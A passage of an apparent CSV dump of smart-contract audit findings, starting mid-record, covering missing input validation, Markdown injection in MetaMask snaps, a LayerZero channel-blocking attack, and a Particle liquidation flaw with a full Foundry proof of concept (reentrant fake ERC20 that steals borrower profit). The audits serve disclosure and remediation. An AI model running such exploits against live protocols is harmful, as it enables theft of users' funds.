        uint256 amount = token.balanceOf(msg.sender);

        // Calculate how many tokens the user should receive
        uint256 redeemed = (amount * holdings[u][m]) / token.totalSupply();

        // Update holdings of underlying
        holdings[u][m] = holdings[u][m] - redeemed;

        // Burn the user's principal tokens
        token.authBurn(msg.sender, amount);

        // Transfer the original underlying token back to the user
        Safe.transfer(IERC20(u), msg.sender, redeemed);

        emit Redeem(0, u, m, redeemed, msg.sender);
    }
```
    function redeem(address u, uint256 m) external unpaused(u, m) {",Dexes|CDP|Yield|Yield Aggregator|Cross Chain
768311,a373ee4fdefaa8167cea261958ac6ee7,Lack of zero-address checks,TrailOfBits,2023-04-18,"DiÔ¨Éculty:  High

Type: Data Validation

Target:  src/
Description
A number of functions in the codebase do not revert if the zero address is passed in for a
parameter that should not be set to zero.
The following parameters, among others, do not have zero-address checks:
‚óè
‚óè
‚óè
‚óè
‚óè
The  token  and  rolesManager  variables in the PoolCustodian‚Äôs  constructor
The  _rolesManager  ,  _pool  , and  _rewardsOperator  in  updateRolesManager  ,
initializePool  , and  updateRewardsOperator  , respectively
The  factoryRegistry  in  LoanFactoryBase  and in the  RCLFactory
The  rolesManager  in  Managed.sol  ‚Äôs  constructor
The  module  address in  RewardsManager.sol  ‚Äôs  addModule  function
Exploit Scenario
Alice, the deployer of the  RCLFactory  , accidentally  sets the  factoryRegistry  parameter
to zero in the constructor. As a result, the  deploy  function will always revert and the
contract will be unusable.
The governance in control of the  RewardsManager  contract  accidentally adds an invalid
module via the  addModule  function. Since all user  actions loop through all of the added
modules, all user-staked positions become permanently locked, and users are prevented
from unstaking or claiming rewards.
Recommendations
Short term, add zero-address checks for the parameters listed above and for all other
parameters for which the zero address is not an acceptable value. Add a
supportsInterface  check for any modules added to the  RewardsManager  contract to
ensure an invalid module cannot be added.
Long term, review input validation across components. Avoid relying solely on the
validation performed by front-end code, scripts, or other contracts, as a bug in any of those
components could prevent them from performing that validation.
`
Trail of Bits
26
Atlendis Labs Security Assessment
PUBLIC",Atlendis Labs Loan Products,Elvis Skozdopolj|Justin Jacob|Gustavo Grieco|Nat Chin,HIGH,,,27,0,0,,https://github.com/trailofbits/publications/blob/master/reviews/2023-03-atlendis-atlendissmartcontracts-securityreview.pdf,https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/2023-03-atlendis-atlendissmartcontracts-securityreview.pdf,https://github.com/trailofbits/publications/blob/master/reviews/2023-03-atlendis-atlendissmartcontracts-securityreview.pdf,solodit_reports,0d69d4c24ef2219eef2b73c6ccbb91f2,2023-09-22 02:45:17,2024-10-14 23:45:42,1,,
769130,d90263057b6f71452e81d9c66c68e251,Missing Input Validation for WalletAddress ‚úì¬†Fixed,ConsenSys,2023-07-01,"#### Resolution



The client acknowledged the issue and fixed it by implementing a regex validation in PR#25 [here](https://github.com/wallet-guard/wallet-guard-snap/pull/25) - Snap shasum `YzN/+ty8xOTEacH19iYGw1a9+MBCgL7PUkU9d/Rf51E=`.
Note that the fix does not validate the address checksum, which is not critical considering the application.


#### Description


The snap prompts users to input the wallet address to be monitored. Users can set wallet addreses that do not adhere to the common Ethereum address format. The user input is not sanitized. This could lead to various injection vulnerabilities such as markdown or control character injections that could break other components.
In particular, the address is sent to the API as a URL query parameter. A malicious attacker could try using that to mount URL injection attacks.


**packages/snap/src/index.ts:L50-L61**



```
if (
 request.method === RpcRequestMethods.UpdateAccount &&
 'walletAddress' in request.params &&
 typeof request.params.walletAddress === 'string'
) {
 const { walletAddress } = request.params;

 if (!walletAddress) {
 throw new Error('no wallet address provided');
 }

 updateWalletAddress(walletAddress);

```
#### Recommendation


Sanitize the address string input by the user and reject all addresses that do not adhere to the Ethereum address format.",Wallet Guard,,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2023/07/wallet-guard/,,,solodit_reports,,2023-09-22 02:46:04,2024-10-14 23:57:54,1,,
785162,e75f10ced8a1cc051aa37616497cf52a,Markdown and Control Character Injection ‚úì¬†Fixed,ConsenSys,2023-08-01,"#### Resolution



Configuration values reflected in the confirmation prompt are implicitly validated by getting user consent on config changes through the `fil_configure` RPC call. Furthermore, confirmation dialogue values have been (mostly) displayed using the `copyable` function, resulting in escaped output.


This issue has been addressed in revision [`1a8715f42cfc9f721e8faab8a7a2610f53592f94`](https://github.com/filecoin-project/filsnap/commit/1a8715f42cfc9f721e8faab8a7a2610f53592f94).




#### Description


The snap uses MetaMask‚Äôs Snaps UI package to present dialogs to users for data verification and action confirmations. While these dialogs ensure dapps don‚Äôt silently execute operations without user consent, some UI components have vulnerabilities. For instance, the `text()` component can render Markdown or be susceptible to control character injections. Specifically, in FilSnap‚Äôs context, when users are prompted to sign a message showing a gas cost estimate if the message contains Markdown-renderable text, the user might unintentionally sign an inaccurate message. It‚Äôs critical to note that the variable `ctx.config` in the provided code snippet could contain untrusted data, potentially altering the context of the displayed message. Malicious manipulation of the snap context is outlined in [issue 4.3](#fil_configure-allows-anyone-to-change-the-snaps-configuration).


**packages/snap/src/rpc/sign-message.ts:L68-L89**



```
const conf = await snapDialog(ctx.snap, {
 type: 'confirmation',
 content: panel([
 heading(`Send ${Token.fromAttoFIL(message.value).toFIL().toString()} to`),
 copyable(message.to),
 divider(),
 heading('Details'),
 text(
 `Gas \_(estimated)\_: \*\*${gas.toFIL().toFormat({
 decimalPlaces: ctx.config.unit?.decimals,
 suffix: ` ${ctx.config.unit?.symbol}`,
 })}\*\*`
 ),
 text(
 `Total \_(amount + gas)\_: \*\*${total.toFIL().toFormat({
 decimalPlaces: ctx.config.unit?.decimals,
 suffix: ` ${ctx.config.unit?.symbol}`,
 })}\*\*`
 ),
 ]),
})

```
#### Recommendation


Prioritize input validation. Encode data securely when presenting it to users. Display original data within an escaped pre-text or code block that prevents rendering non-standard characters or Markdown. Subsequently, add any derived or decoded data to offer users a comprehensive understanding.",MetaMask/Partner Snaps - FilSnap,Dominik Muhs,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2023/08/metamask/partner-snaps-filsnap/,,,solodit_reports,,2023-10-12 21:08:37,2024-10-15 00:06:35,1,,
815040,57f7e89e0ba6ec321ce7b58910c9a0b6,[H-01] Missing user input validation can lead to stuck funds,Pashov,2023-07-01,"**Severity**

**Impact:**
High, as all mint fees can be stuck forever

**Likelihood:**
Medium, as users can easily misconfigure inputs

**Description**

There are multiple insufficiencies in the input validation of the arguments of the `initialize` method in `Nft`:

1. The sum of the `supply` of all `categories_` can be less than the `maxMintSupply_` - this would lead to the mint never completing, which results in all of the ETH in the `Nft` contract coming from mints so far being stuck in it forever
2. The `duration` of the `vestingParams_` should have a lower and upper bound as for example a too big of a duration can mean vesting can never complete or a division rounding error
3. The `mintEndTimestamp` of `refundParams_` should not be too further away in the future otherwise refund & vesting mechanisms would never work, and if it is too close then the mint mechanism won't work.

**Recommendations**

Add a validation that the sum of all categories' supply is more than or equal to the `maxMintSupply`. Also add sensible upper and lower bounds for both `duration` for the vesting mechanism and `mintEndTimestamp` for the refund mechanism.",Baton Launchpad,Pashov,HIGH,Missing Check,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-07-01-Baton Launchpad.md,,,solodit_reports,,2023-10-02 21:07:58,2024-03-07 21:08:35,1,,Launchpad
815096,1f7c1b44e2ed8c08357ed6fe53aa21a5,claim ‚Äì Incomplete and lenient implementation ‚úì¬†Fixed,ConsenSys,2023-05-01,"#### Resolution



Acknowledged but not fixed in this version. The client provided the following message: ‚ÄúNo fix for this version. This one is not a bug in the code but is a missing feature on product logic. The product is good for release without a fix. We may implement related functions in the future.‚Äù


#### Description


In the current version of the code, the `claim` function is lacking crucial input validation logic as well as required state changes. Most of the process is implemented in other contracts or off-chain at the moment and is therefore out of scope for this audit, but there might still be issues caused by potential errors in the process. Moreover, pool manager and committee together have unlimited ownership of the deposits and can essentially withdraw all collateral to any desired address.


#### Examples


**code/contracts/Pool.sol:L588-L592**



```
function claim(
 uint256 policyIndex\_,
 uint256 amount\_,
 address receipient\_
) external onlyPoolManager {

```
#### Recommendation


To ensure a more secure claiming process, we propose adding the following logic to the `claim` function:


1. `refund` should be called at the beginning of the `claim` flow, so that the recipient‚Äôs true coverage amount will be used.
2. `policyIndex` should be added as a parameter to this function, so that `coverageMap` can be used to validate that the amount claimed on behalf of a recipient is covered.
3. The payout amount should be subtracted in the `coveredMap` and `coverageMap` mappings.",Tidal,Heiko Fisch| David Oz,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2023/05/tidal/,,,solodit_reports,,2023-10-12 21:07:36,2024-10-14 23:46:39,1,,
1175001,c176a1eb20de9af169ba399abc1e1241,claim ‚Äì Incomplete and Lenient Implementation ‚úì¬†Fixed,ConsenSys,2023-05-01,"#### Resolution



Acknowledged but not fixed in this version. The client provided the following message: ‚ÄúNo fix for this version. This one is not a bug in the code but is a missing feature on product logic. The product is good for release without a fix. We may implement related functions in the future.‚Äù


#### Description


In the current version of the code, the `claim` function is lacking crucial input validation logic as well as required state changes. Most of the process is implemented in other contracts or off-chain at the moment and is therefore out of scope for this audit, but there might still be issues caused by potential errors in the process. Moreover, pool manager and committee together have unlimited ownership of the deposits and can essentially withdraw all collateral to any desired address.


#### Examples


**contracts/Pool.sol:L588-L592**



```
function claim(
 uint256 policyIndex\_,
 uint256 amount\_,
 address receipient\_
) external onlyPoolManager {

```
#### Recommendation


To ensure a more secure claiming process, we propose adding the following logic to the `claim` function:


1. `refund` should be called at the beginning of the `claim` flow, so that the recipient‚Äôs true coverage amount will be used.
2. `policyIndex` should be added as a parameter to this function, so that `coverageMap` can be used to validate that the amount claimed on behalf of a recipient is covered.
3. The payout amount should be subtracted in the `coveredMap` and `coverageMap` mappings.",Tidal,Heiko Fisch| David Oz,HIGH,,,0,0,0,,https://consensys.net/diligence/audits/2023/05/tidal/,,,solodit_reports,,2023-11-06 21:07:22,2024-10-14 23:46:36,1,,
1385048,a2967bc0ccd512adad310b31dc0b9d78,[H-17] Attacker can block LayerZero channel due to missing check of minimum gas passed,Code4rena,2023-07-05,"This is an issue that affects all the contracts that inherit from `NonBlockingLzApp` due to incorrect overriding of the `lzSend` function and lack of input validation and the ability to specify whatever [`adapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L101) you want.
The consequence of this is that anyone can with a low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.

### Proof of Concept

**Layer Zero minimum gas showcase**

While sending messages through LayerZero, the sender can specify how much gas he is willing to give to the Relayer to deliver the payload to the destination chain. This configuration is specified in [relayer adapter params](https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters).
All the invocations of `lzSend` inside the TapiocaDao contracts naively assume that it is not possible to specify less than 200k gas on the destination, but in reality, you can pass whatever you want.
As a showcase, I have set up a simple contract that implements the `NonBlockingLzApp` and sends only 30k gas which reverts on the destination chain resulting in `StoredPayload` and blocking of the message pathway between the two lzApps.
The transaction below proves that if no minimum gas is enforced, an application that has the intention of using the `NonBlockingApp` can end up in a situation where there is a `StoredPayload` and the pathway is blocked.

Transaction Hashes for the example mentioned above:

*   LayerZero Scan: <https://layerzeroscan.com/106/address/0xe6772d0b85756d1af98ddfc61c5339e10d1b6eff/message/109/address/0x5285413ea82ac98a220dd65405c91d735f4133d8/nonce/1>
*   Tenderly stack trace of the sending transaction hash: <https://dashboard.tenderly.co/tx/avalanche-mainnet/0xe54894bd4d19c6b12f30280082fc5eb693d445bed15bb7ae84dfaa049ab5374d/debugger?trace=0.0.1>
*   Tenderly stack trace of the receiving transaction hash: <https://dashboard.tenderly.co/tx/polygon/0x87573c24725c938c776c98d4c12eb15f6bacc2f9818e17063f1bfb25a00ecd0c/debugger?trace=0.2.1.3.0.0.0.0>

**Attack scenario**

The attacker calls [`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L99) and specifies a small amount of gas in the [airdropAdapterParams(\~50k gas)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41).
The Relayer delivers the transaction with the specified gas at the destination.

The transaction is first validated through the LayerZero contracts before it reaches the `lzReceive` function. The Relayer will give exactly the gas which was specified through the `airdropAdapterParams`.
The line where it happens inside the LayerZero contract is [here](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L118), and `{gas: _gasLimit}` is the gas the sender has paid for.
The objective is that due to this small gas passed the transaction reverts somewhere inside the [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L36-L41) function and the message pathway is blocked, resulting in [`StoredPayload`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/Endpoint.sol#L122).

The objective of the attack is that the execution doesn't reach the [`NonblockingLzApp`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25) since then the behavior of the `NonBlockingLzApp` would be as expected and the pathway wouldn't be blocked,
but rather the message would be stored inside the [`failedMessages`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L18)

### Tools Used

Foundry, Tenderly, LayerZeroScan

### Recommended Mitigation Steps

The minimum gas enforced to send for each and every `_lzSend` in the app should be enough to cover the worst-case scenario for the transaction to reach the
first try/catch which is [here](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/NonblockingLzApp.sol#L25).

I would advise the team to do extensive testing so this min gas is enforced.

Immediate fixes:

1.  This is most easily fixed by overriding the [`_lzSend`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L49) and extracting the gas passed from adapterParams with [`_getGasLimit`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/lzApp/LzApp.sol#L63) and validating that it is above some minimum threshold.

2.  Another option is specifying the minimum gas for each and every packetType and enforcing it as such.

I would default to the first option because the issue is twofold since there is the minimum gas that is common for all the packets, but there is also the minimum gas per packet since each packet has a different payload size and data structure, and it is being differently decoded and handled.

Note: This also applies to the transaction which when received on the destination chain is supposed to send another message, this callback message should also be validated.

When it comes to the default implementations inside the [`OFTCoreV2`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L10) there are two packet types [`PT_SEND`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L94)
and [`PT_SEND_AND_CALL`](https://github.com/Tapioca-DAO/tapioca-sdk/blob/1eff367cd8660ecea4d5ed87184eb76c93791c96/src/contracts/token/oft/v2/OFTCoreV2.sol#L119) and there is the available configuration of `useCustomAdapterParams` which can enforce the minimum gas passed. This should all be configured properly.

### Other occurrences

There are many occurrences of this issue in the TapiocaDao contracts, but applying option 1 I mentioned in the mitigation steps should solve the issue for all of them:

<details>

**TapiocaOFT**

`lzSend`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L101> - lzData.extraGas This naming is misleading it is not extraGas it is the gas that is used by the Relayer.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L68>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L99>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L66>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L114>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L70>

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L111>

`sendFrom`

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142> - This is executed as a part of lzReceive but is a message inside a message. It is also subject to the attack above, although it goes through the `PT_SEND` so adequate config should solve the issue.

<https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L241>

### BaseUSDO

`lzSend`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L41>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L86>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L51>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L82>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L48>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L87>

`sendFrom`

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L127>

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L226>

### BaseTapOFT

`lzSend`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L108>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L181>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L274>

`sendFrom`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L312>

### MagnetarV2

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/MagnetarV2.sol#L268>

### MagnetarMarketModule

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/modules/MagnetarMarketModule.sol#L725>

</details>

**[0xRektora (Tapioca) confirmed via duplicate issue 841](https://github.com/code-423n4/2023-07-tapioca-findings/issues/841)**

***",Tapioca DAO,0x73696d616f|windhustler,HIGH,,390000,0,0,0,https://github.com/code-423n4/2023-07-tapioca-findings/issues/1207,https://code4rena.com/reports/2023-07-tapioca,,https://code4rena.com/reports/2023-07-tapioca,solodit_reports,68088c8dc74b057a3c10bc429f1c22e2,2023-11-20 21:08:15,2024-10-15 00:00:50,1,"bytes calldata airdropAdapterParams,
```
    function triggerSendFrom(
```
        bytes calldata airdropAdapterParams,
```
        try ILayerZeroReceiver(_dstAddress).lzReceive{gas: _gasLimit}(_srcChainId, _srcAddress, _nonce, _payload) {
```
        // lzReceive must be called by the endpoint for security
        require(_msgSender() == address(lzEndpoint), ""LzApp: invalid endpoint caller"");

        bytes memory trustedRemote = trustedRemoteLookup[_srcChainId];
        // if will still block the message pathway from (srcChainId, srcAddress). should not receive message from untrusted remote.
        require(_srcAddress.length == trustedRemote.length && trustedRemote.length > 0 && keccak256(_srcAddress) == keccak256(trustedRemote), ""LzApp: invalid source sending contract"");
```
            storedPayload[_srcChainId][_srcAddress] = StoredPayload(uint64(_payload.length), _dstAddress, keccak256(_payload));
```
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft(), 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
```
    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;
```
    function _lzSend(uint16 _dstChainId, bytes memory _payload, address payable _refundAddress, address _zroPaymentAddress, bytes memory _adapterParams, uint _nativeFee) internal virtual {
```
    function _getGasLimit(bytes memory _adapterParams) internal pure virtual returns (uint gasLimit) {
```
abstract contract OFTCoreV2 is NonblockingLzApp {
```
    function _send(address _from, uint16 _dstChainId, bytes32 _toAddress, uint _amount, address payable _refundAddress, address _zroPaymentAddress, bytes memory _adapterParams) internal virtual returns (uint amount) {
```
    function _sendAndCall(address _from, uint16 _dstChainId, bytes32 _toAddress, uint _amount, bytes memory _payload, uint64 _dstGasForCall, address payable _refundAddress, address _zroPaymentAddress, bytes memory _adapterParams) internal virtual returns (uint amount) {
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        ISendFrom(address(this)).sendFrom{value: address(this).balance}(
```
            ISendFrom(tapSendData.tapOftAddress).sendFrom(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
        ISendFrom(address(this)).sendFrom{value: address(this).balance}(
```
            ISendFrom(tapSendData.tapOftAddress).sendFrom(
```
        _lzSend(
```
        _lzSend(
```
        _lzSend(
```
                ISendFrom(address(rewardTokens[i])).sendFrom{
```
            this.sendFrom{value: address(this).balance}(
```
                ISendFrom(_action.target).sendFrom{value: _action.value}(
```
        ISendFrom(address(asset)).sendFrom{value: gas}(",Cross Chain
1505022,df97a7621ce7138e75f553698c816c7b,[H-03] liquidatePosition() liquidator can construct malicious data to steal the borrower's profit,Code4rena,2023-12-11,"When the Loan expires, and `RenewalCutoffTime` has been set, anyone can execute the liquidation method `liquidatePosition()`.<br>
Execution path: `liquidatePosition()` -> `_closePosition()` -> `Base.swap(params.data)`

The problem is that this `params.data` can be arbitrarily constructed by the liquidator.
As long as there is enough `amountReceived` after the exchange for repayment, it will not `revert`.

In this way, you can maliciously construct `data` and steal the extra profit of the liquidator. (At least `amountReceived` must be guaranteed)

Assume:

collateral + tokenPremium = 120<br>
repay minimum `amountReceived` only need 100 to swap<br>
so borrower Profit 120 - 100 = 20

1.  create fakeErc20 and fakePool (token0 = fakeErc20,token1 = WETH)
2.  execute liquidatePosition():pool = fakePool , swapAmount = 120   (all collateral + tokenPremium)
3.  in fakeErc20.transfer() reentry execute reply 100 equivalent `amountReceived` (transfer to ParticlePositionManager)
4.  liquidatePosition() success , steal 120 - 100 = 20

### Proof of Concept

Add to `LiquidationTest.t.sol`:

<details>

```solidity
contract FakeErc20 is ERC20 {
    bool public startTransfer = false;
    address public transferTo;
    uint256 public transferAmount;
    constructor() ERC20("""","""") {
    }    
    function set(bool _startTransfer,address _transferTo,uint256 _transferAmount) external {
        startTransfer = _startTransfer;
        transferTo = _transferTo;
        transferAmount = _transferAmount;
    }
    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        //for pay loan , usdc
        if(startTransfer) ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(transferTo,transferAmount);
        return true;
    }    
}


    FakeErc20 public fakeErc20 = new FakeErc20();
    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata
    ) external {
        ERC20 token0 = address(fakeErc20) < address(WETH) ? ERC20(fakeErc20):ERC20(address(WETH));
        ERC20 token1 = address(fakeErc20) < address(WETH) ? ERC20(address(WETH)):ERC20(fakeErc20);
        if (amount0Owed > 0) token0.transfer(msg.sender,amount0Owed);
        if (amount1Owed > 0) token1.transfer(msg.sender,amount1Owed);
        
    }    
    function testStealProfit() public {
        //1. open Position
        _openLongPosition();
        _addPremium(PREMIUM_0, PREMIUM_1);
        vm.warp(block.timestamp + 1 seconds);
        _renewalCutoff();
        vm.warp(block.timestamp + 7 days);

        //2. init fake pool
        address anyone = address(0x123990088); 
        uint256 fakePoolGetETH;
        uint256 payUsdcToLp;
        uint256 amountToAdd;
        bytes memory data;
        vm.startPrank(WHALE);
        WETH.transfer(address(this), 1000e18);
        fakeErc20.mint(address(this), 1000e18);
        vm.stopPrank();
        IUniswapV3Pool fakePool = IUniswapV3Pool(uniswapV3Factory.createPool(address(WETH), address(fakeErc20), FEE));
        fakePool.initialize(TickMath.getSqrtRatioAtTick((_tickLower + _tickUpper) / 2 ));
        fakePool.mint(address(this), _tickLower, _tickUpper, 1e18, """");

        //3. compute swap amount
        {
            (,uint128 token1Owed,,uint128 token1Premium,,uint256 collateral1) = particleInfoReader.getOwedInfo(SWAPPER, LIEN_ID);
            (uint40 tokenId, uint128 liquidity, , , , , , ) = particleInfoReader.getLien(SWAPPER, LIEN_ID);
            (payUsdcToLp, amountToAdd) = Base.getRequiredRepay(liquidity, tokenId);

            uint256 amountSwap = collateral1 + token1Premium - amountToAdd - token1Owed - (token1Premium * LIQUIDATION_REWARD_FACTOR /BASIS_POINT);
            
        
            ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: address(WETH),
                tokenOut: address(fakeErc20),
                fee: FEE,
                recipient: anyone,
                deadline: block.timestamp,
                amountIn: amountSwap,
                amountOutMinimum: 0,
                sqrtPriceLimitX96:0
            });
            data = abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector, params);
            //4. execute liquidatePosition pay usdc and get eth
            vm.startPrank(WHALE);
            USDC.transfer(address(fakeErc20), payUsdcToLp);
            fakeErc20.set(true,address(particlePositionManager),payUsdcToLp);
            vm.stopPrank();     
            uint256 fakePoolEthBalance = WETH.balanceOf(address(fakePool));
            vm.startPrank(anyone);
            particlePositionManager.liquidatePosition(
                DataStruct.ClosePositionParams({lienId: uint96(LIEN_ID), amountSwap: amountSwap, data: data}),
                SWAPPER
            );
            vm.stopPrank(); 
            fakePoolGetETH = WETH.balanceOf(address(fakePool)) -  fakePoolEthBalance;                
        }
   
        //5. show steal usdc
        console.log(""steal eth :"",fakePoolGetETH);  
        console.log(""pay usdc:"",payUsdcToLp / 1e6);  
        uint256 usdcBefore = USDC.balanceOf(address(fakePool));
        _swap(address(fakePool),address(WETH),address(USDC),FEE,fakePoolGetETH); //Simplify: In reality can use fakeErc20 swap eth
        console.log(""steal eth swap to usdc:"",(USDC.balanceOf(address(fakePool)) - usdcBefore) / 1e6);  
        console.log(""steal usdc:"",(USDC.balanceOf(address(fakePool)) - usdcBefore - payUsdcToLp)/1e6);  
    }

```

</details>

```console
forge test -vvv --match-test testStealProfit --fork-url https://eth-mainnet.g.alchemy.com/v2/xxx --fork-block-number 18750931


Logs:
  steal eth : 790605367691135637
  pay usdc: 737
  steal eth swap to usdc: 1856
  steal usdc: 1118

```

### Impact

Liquidator can construct malicious data to steal the borrower's profit.

### Recommended Mitigation

It is recommended to remove `data`.<br>
The protocol already knows the `token0/token1` and `params.amountSwap` that need to be exchanged, which is enough to construct the elements needed for swap.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868213971):**
 > This is a great finding around our arbitrary swap data. The reason we have it is that we wanted to use 1inch to route for the best price when swapping.
> 
> In your recommendation
> 
> > It is recommended to remove data.<br>
> > The protocol already knows the token0/token1 and params.amountSwap that need to be exchanged, which is enough to construct the elements needed for swap.
> 
> That means we use the `swapExactInput` inside our `Base.swap` to replace `data`, right?
> 
> -- 
> 
> Want to discuss more here though, is this attack applicable to *any* ERC20 tokens? This step:
> 
> > in fakeErc20.transfer() reentry execute reply 100 equivalent amountReceived (transfer to ParticlePositionManager)
> 
> can't be generally triggered for normal ERC20, right? There isn't a callback when receiving ERC20 (unlike ERC721 on receive callback)?
> 
> How often does a normal ERC20 have a customized callback to allow reentrancy like the `FakeErc20` in example? Thanks!

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868356149):**
 > Agree with this finding and it's severity.

**[wukong-particle (Particle) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868470391):**
 > Acknowledging the issue as it indeed can happen if a malicious erc20 is designed for our protocol. But unlikely to patch completely because otherwise we wouldn't be use 1inch or other general router.
> 
> We disagree with the severity though, because this attack, at its current design, can't apply to all ERC20 in general. Wardens please do raise concern if our understanding is incorrect here. Thanks!

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1868488851):**
 > So to clarify, for this attack to be possible, the protocol would need to have a pool containing a malicious erc20 token and have significant liquidity in this pool? @wukong-particle 
>
 > Can this attack not also be possible with any token with callbacks enabled?
>
 > Also, regardless of a malicious erc20 token, we could still extract significant value by sandwiching attacking the swap no?
> 
> Consider the following snippet of code:
> ```solidity
> function swap(
>     IAggregationExecutor caller,
>     SwapDescription calldata desc,
>     bytes calldata data
> )
>     external
>     payable
>     returns (uint256 returnAmount, uint256 gasLeft)
> {
>     require(desc.minReturnAmount > 0, ""Min return should not be 0"");
>     require(data.length > 0, ""data should not be empty"");
> 
>     uint256 flags = desc.flags;
>     IERC20 srcToken = desc.srcToken;
>     IERC20 dstToken = desc.dstToken;
> 
>     bool srcETH = srcToken.isETH();
>     if (flags & _REQUIRES_EXTRA_ETH != 0) {
>         require(msg.value > (srcETH ? desc.amount : 0), ""Invalid msg.value"");
>     } else {
>         require(msg.value == (srcETH ? desc.amount : 0), ""Invalid msg.value"");
>     }
> 
>     if (!srcETH) {
>         _permit(address(srcToken), desc.permit);
>         srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
